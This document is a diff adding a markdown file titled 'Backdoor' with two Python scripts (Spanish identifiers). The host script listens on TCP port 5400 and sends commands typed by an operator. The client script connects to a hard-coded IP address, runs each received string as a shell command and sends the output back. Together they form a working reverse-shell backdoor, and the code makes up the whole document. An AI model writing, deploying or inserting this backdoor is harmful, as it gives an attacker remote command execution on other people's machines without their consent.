@@ -1,0 +1,65 @@
+# Backdoor
+
+
+*HOST
+
+from distutils.cmd import Command
+from pickle import TRUE
+import socket
+import os
+
+Host = ''
+Puerto = 5400
+
+Sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #Conexión mediante ip y tcp
+
+Sock.bind((Host,Puerto))
+
+Sock.listen(5)
+print ("Waiting for connections "+ str(Puerto)) 
+
+def connections():
+    CN,AD = Sock.accept()
+    print ("Connected to "+ AD[0]) 
+    Commands(CN)
+    CN.close()
+
+def Commands(CN):
+    while TRUE:
+        Com = input("Command> ")
+        if str.encode(Com) == 'q':break
+        if len(str.encode(Com)) >0:
+            CN.send(str.encode(Com))
+            X = str(CN.recv(1024))
+            os.system('cls')
+            print(X)
+
+connections()
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+*CLIENT*
+
+from pickle import TRUE
+import socket
+import subprocess
+import os
+from sys import stdout
+
+Host = '192.168.68.104'
+Puerto = 5400
+Sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+Sock.connect((Host,Puerto))
+
+while TRUE:
+    data = Sock.recv(1024)
+    
+    if data[:2].decode('utf-8') == 'cd':
+        os.chdir(data[3:].decode('utf-8'))
+    if len(data)>0:
+        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True,stderr=subprocess.PIPE, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
+        bytes = cmd.stdout.read()+cmd.stderr.read()
+        info_client = str(bytes)
+        Sock.send(str.encode(info_client)+ str.encode(os.getcwd()+">"))
+Sock.close()
